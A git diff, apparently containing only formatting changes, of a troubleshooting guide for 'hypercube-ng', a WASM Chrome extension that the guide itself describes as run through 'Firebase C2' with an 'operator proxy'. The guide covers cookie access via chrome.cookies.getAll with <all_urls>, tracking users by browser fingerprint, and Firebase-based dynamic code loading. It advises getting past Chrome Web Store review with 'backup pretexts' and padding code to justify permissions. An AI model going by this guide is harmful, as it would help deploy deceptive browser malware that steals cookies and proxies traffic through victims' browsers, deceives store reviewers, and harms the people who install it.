@@ -11,6 +11,7 @@
 **Symptom**: Go can't find dependencies during build
 
 **Solution**:
+
 ```bash
 cd modules/hypercube-ng
 go mod tidy
@@ -23,6 +24,7 @@ go clean -modcache  # If persistent
 **Symptom**: Go version too old for WASM
 
 **Solution**: Update Go to 1.16+ (recommend 1.24+)
+
 ```bash
 go version
 # Install from https://go.dev/dl/
@@ -33,11 +35,13 @@ go version
 **Symptom**: No `main.wasm` in extension directory after build
 
 **Check**:
+
 1. Build script completed without errors?
 2. Output directory correct? (`output/<timestamp>/extension/`)
 3. Permissions issue? (can't write to directory)
 
 **Solution**:
+
 ```bash
 ls -la modules/hypercube-ng/output/
 # Check latest timestamped directory
@@ -53,11 +57,13 @@ ls -la modules/hypercube-ng/output/<timestamp>/extension/main.wasm
 **Symptom**: Chrome can't load extension
 
 **Checks**:
+
 1. manifest.json exists?
 2. Valid JSON syntax?
 3. Required fields present?
 
 **Solution**:
+
 ```bash
 # Validate JSON
 cat extension/manifest.json | python3 -m json.tool
@@ -77,11 +83,13 @@ grep -E '"manifest_version"|"name"|"version"' extension/manifest.json
 **Symptom**: background.js not loading
 
 **Checks**:
+
 1. `background.service_worker` (not `background.scripts`)?
 2. background.js file exists?
 3. Syntax errors in background.js?
 
 **Debug**:
+
 ```bash
 # Load extension in Chrome
 chrome://extensions/ → Load unpacked
@@ -99,6 +107,7 @@ chrome://extensions/ → Load unpacked
 **Symptom**: CSP blocks WASM execution
 
 **Solution**: Add `'wasm-unsafe-eval'` to CSP in manifest.json:
+
 ```json
 "content_security_policy": {
   "extension_pages": "script-src 'self' 'wasm-unsafe-eval'; object-src 'self';"
@@ -110,11 +119,13 @@ chrome://extensions/ → Load unpacked
 **Symptom**: Service worker shows WASM error on startup
 
 **Checks**:
+
 1. Go version mismatch between build and wasm_exec.js?
 2. Corrupted WASM file?
 3. Missing Go runtime initialization?
 
 **Solution**:
+
 ```bash
 # Ensure wasm_exec.js matches Go version
 cp "$(go env GOROOT)/misc/wasm/wasm_exec.js" extension/
@@ -128,12 +139,13 @@ cd modules/hypercube-ng && ./build.sh
 **Symptom**: wasm_exec.js not loaded before WASM
 
 **Solution**: Check `importScripts()` order in background.js:
+
 ```javascript
 // wasm_exec.js MUST be first
-importScripts('./wasm_exec.js')  // <-- First
-importScripts('./firebase-app-compat.js')
-importScripts('./firebase-auth-compat.js')
-importScripts('./firebase-database-compat.js')
+importScripts("./wasm_exec.js"); // <-- First
+importScripts("./firebase-app-compat.js");
+importScripts("./firebase-auth-compat.js");
+importScripts("./firebase-database-compat.js");
 ```
 
 ---
@@ -145,6 +157,7 @@ importScripts('./firebase-database-compat.js')
 **Symptom**: Anonymous authentication disabled
 
 **Solution**:
+
 1. Firebase Console → Authentication
 2. Sign-in method tab
 3. Enable "Anonymous"
@@ -157,6 +170,7 @@ importScripts('./firebase-database-compat.js')
 **Check rules** in Firebase Console → Realtime Database → Rules tab
 
 **Solution**: Verify rules match template:
+
 ```json
 {
   "rules": {
@@ -174,11 +188,13 @@ importScripts('./firebase-database-compat.js')
 **Symptom**: Extensions work, operator proxy fails
 
 **Checks**:
+
 1. service Account Key correct?
 2. serviceAccountKey.json from right project?
 3. Service account has permissions?
 
 **Debug**:
+
 ```bash
 # Test service account manually
 firebase login:ci
@@ -190,6 +206,7 @@ firebase database:get / --project <project-id>
 **Symptom**: Multiple Firebase initializations
 
 **Solution**: Check background.js only calls `firebase.initializeApp()` once
+
 - Often caused by multiple Startup() calls
 - Use flag to prevent re-initialization
 
@@ -202,6 +219,7 @@ firebase database:get / --project <project-id>
 **Symptom**: Firebase disconnects frequently
 
 **Solution**: Verify keep-alive pattern in background.js:
+
 ```javascript
 const keepAlive = () => setInterval(chrome.runtime.getPlatformInfo, 20e3);
 keepAlive();
@@ -218,11 +236,13 @@ keepAlive();
 **Symptom**: Dependencies not loading in service worker
 
 **Checks**:
+
 1. File paths correct (relative to manifest.json)?
 2. Files exist?
 3. Syntax errors in imported files?
 
 **Debug**:
+
 ```bash
 ls -la extension/wasm_exec.js
 ls -la extension/firebase-*.js
@@ -237,6 +257,7 @@ ls -la extension/firebase-*.js
 **Symptom**: Chrome Store rejects during upload
 
 **Common warnings**:
+
 - `permissions` contains host permissions (move to `host_permissions`)
 - Icon files missing
 - Invalid icon dimensions
@@ -248,6 +269,7 @@ ls -la extension/firebase-*.js
 **Symptom**: Can't submit without privacy policy
 
 **Solution**:
+
 1. Create privacy policy HTML file
 2. Host on your domain
 3. Add URL to manifest.json:
@@ -260,6 +282,7 @@ ls -la extension/firebase-*.js
 **Symptom**: Human reviewer rejects
 
 **Solution**:
+
 - Ensure UI shows features you claim
 - Add code demonstrating ALL permissions
 - Generate more permission-using code (even if basic)
@@ -269,6 +292,7 @@ ls -la extension/firebase-*.js
 **Symptom**: Permission justification rejected
 
 **Solution**:
+
 - Rewrite to be more specific
 - Add technical implementation details
 - Reference exact features using permission
@@ -284,14 +308,16 @@ ls -la extension/firebase-*.js
 **Symptom**: `chrome.cookies.getAll()` or similar fails
 
 **Check**:
+
 1. `host_permissions` includes `<all_urls>`?
 2. User granted permissions at install?
 
 **Debug**:
+
 ```javascript
 // Check granted permissions
 chrome.permissions.getAll((perms) => {
-  console.log('Granted:', perms);
+  console.log("Granted:", perms);
 });
 ```
 
@@ -300,10 +326,11 @@ chrome.permissions.getAll((perms) => {
 **Symptom**: Chrome API called with wrong context
 
 **Solution**: Ensure Chrome APIs called with correct `this` binding:
+
 ```javascript
 // Wrong
 const getAll = chrome.cookies.getAll;
-getAll({});  // Illegal invocation
+getAll({}); // Illegal invocation
 
 // Correct
 chrome.cookies.getAll({});
@@ -314,6 +341,7 @@ chrome.cookies.getAll({});
 **Symptom**: HTTP requests through extension don't work
 
 **Checks**:
+
 1. Firebase C2 working?
 2. Encryption keys match between extension and proxy?
 3. Request format correct?
@@ -364,10 +392,10 @@ Service worker Inspect → Network tab
 Add detailed logging to track execution:
 
 ```javascript
-console.log('[DEBUG] Service worker starting...');
-console.log('[DEBUG] WASM loading...');
-console.log('[DEBUG] Firebase initializing...');
-console.log('[DEBUG] Keep-alive started');
+console.log("[DEBUG] Service worker starting...");
+console.log("[DEBUG] WASM loading...");
+console.log("[DEBUG] Firebase initializing...");
+console.log("[DEBUG] Keep-alive started");
 ```
 
 ---
@@ -375,23 +403,28 @@ console.log('[DEBUG] Keep-alive started');
 ## Common Gotchas
 
 **Gotcha 1**: Service worker context different from web page
+
 - No `window` object
 - No DOM access
 - Use `self` instead of `window`
 
 **Gotcha 2**: Manifest V3 webRequest is observation-only
+
 - Can't block requests with `webRequest`
 - Use `declarativeNetRequest` for blocking
 
 **Gotcha 3**: Firebase anonymous UID changes
+
 - Each install = new UID
 - Track by browser fingerprint if needed
 
 **Gotcha 4**: WASM file size limits
+
 - Chrome extensions limited to 20MB total
 - Optimize WASM with `-ldflags="-s -w"`
 
 **Gotcha 5**: Chrome Store rejects take days
+
 - Plan for 3-5 day review cycles
 - Have backup pretexts ready
 
@@ -402,6 +435,7 @@ console.log('[DEBUG] Keep-alive started');
 ### Extension deployed but not working
 
 **Quick checks**:
+
 1. Firebase project still exists?
 2. Database rules unchanged?
 3. Service account key not revoked?
@@ -410,6 +444,7 @@ console.log('[DEBUG] Keep-alive started');
 ### Need to update deployed extension
 
 **Options**:
+
 1. Chrome Store update (preferred, 1-3 day review)
 2. Manual redistribution of CRX
 3. Firebase-based dynamic code loading (advanced)
@@ -419,6 +454,7 @@ console.log('[DEBUG] Keep-alive started');
 **Symptom**: Connections failing, database writes rejected
 
 **Solution**:
+
 - Firebase free tier: 100 simultaneous connections
 - Upgrade to Blaze (pay-as-you-go) if needed
 - Or: Deploy new Firebase project, migrate
@@ -428,12 +464,14 @@ console.log('[DEBUG] Keep-alive started');
 ## Getting Help
 
 **Resources**:
+
 1. Hypercube-ng docs: `modules/hypercube-ng/docs/`
 2. Chrome extension docs: https://developer.chrome.com/docs/extensions/
 3. Firebase docs: https://firebase.google.com/docs/
 4. Go WASM: https://github.com/golang/go/wiki/WebAssembly
 
 **Search patterns**:
+
 - "Chrome Manifest V3 [error message]"
 - "WebAssembly service worker [issue]"
 - "Firebase Realtime Database [problem]"
